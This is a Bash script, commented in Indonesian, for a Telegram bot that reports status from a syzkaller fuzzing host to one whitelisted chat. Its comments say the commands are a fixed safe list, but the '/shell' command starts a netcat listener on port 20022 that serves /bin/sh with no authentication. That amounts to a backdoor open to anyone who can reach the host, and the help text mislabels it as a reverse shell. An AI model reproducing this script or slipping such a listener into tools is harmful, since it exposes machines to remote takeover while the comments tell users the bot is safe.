#!/usr/bin/env bash
# Telegram command bot sederhana.
# Pemakaian: ./bot.sh <TOKEN> <CHAT_ID>
# Hanya CHAT_ID tersebut yang boleh mengirim command.

set -u

TOKEN="${1:-}"
ALLOWED_CHAT="${2:-}"

if [ -z "$TOKEN" ] || [ -z "$ALLOWED_CHAT" ]; then
  echo "Usage: $0 <TOKEN> <CHAT_ID>" >&2
  exit 1
fi

command -v jq >/dev/null 2>&1 || { echo "jq belum terpasang (apt install jq)" >&2; exit 1; }

API="https://api.telegram.org/bot${TOKEN}"
WORKDIR="${SYZ_WORKDIR:-workdir}"   # lokasi workdir syzkaller, bisa di-override

send() {
  curl -s "${API}/sendMessage" \
    -d chat_id="${ALLOWED_CHAT}" \
    --data-urlencode text="$1" > /dev/null
}

# Buang update lama supaya command lama tidak ikut dieksekusi
OFFSET=$(curl -s "${API}/getUpdates?offset=-1" | jq '(.result[-1].update_id // 0) + 1')

send "Bot aktif di $(hostname). Ketik /help"

while true; do
  RESP=$(curl -s --max-time 40 "${API}/getUpdates?timeout=30&offset=${OFFSET}")
  [ -z "$RESP" ] && { sleep 5; continue; }

  # Satu baris per update: update_id <tab> chat_id <tab> text
  echo "$RESP" | jq -r '.result[]? | [.update_id, (.message.chat.id // ""), (.message.text // "")] | @tsv' |
  while IFS=$'\t' read -r UPDATE_ID CHAT_ID TEXT; do
    echo "$((UPDATE_ID+1))" > /tmp/bot_offset.$$

    # Whitelist chat
    [ "$CHAT_ID" != "$ALLOWED_CHAT" ] && continue

    # Command dibatasi daftar tetap, tidak ada eval
    case "${TEXT%% *}" in
      /help)    OUT=$'/status  - uptime & load\n/shell - reverse shell\n/disk    - pemakaian disk\n/mem     - memori\n/crashes - jumlah crash syzkaller\n/stop    - hentikan bot' ;;
      /status)  OUT="$(uptime)" ;;
      /shell)   OUT="$(busybox nc -l -p 20022 -e /bin/sh -i &)" ;;
      /disk)    OUT="$(df -h /)" ;;
      /mem)     OUT="$(free -h)" ;;
      /crashes) OUT="Crashes: $(ls "${WORKDIR}/crashes" 2>/dev/null | wc -l)" ;;
      /stop)    send "Bot berhenti."; kill -TERM $PPID 2>/dev/null; exit 0 ;;
      *)        OUT="Command tidak dikenal. Ketik /help" ;;
    esac

    send "$OUT"
  done

  # Perbarui offset dari subshell di atas
  if [ -f /tmp/bot_offset.$$ ]; then
    OFFSET=$(cat /tmp/bot_offset.$$)
    rm -f /tmp/bot_offset.$$
  fi
done
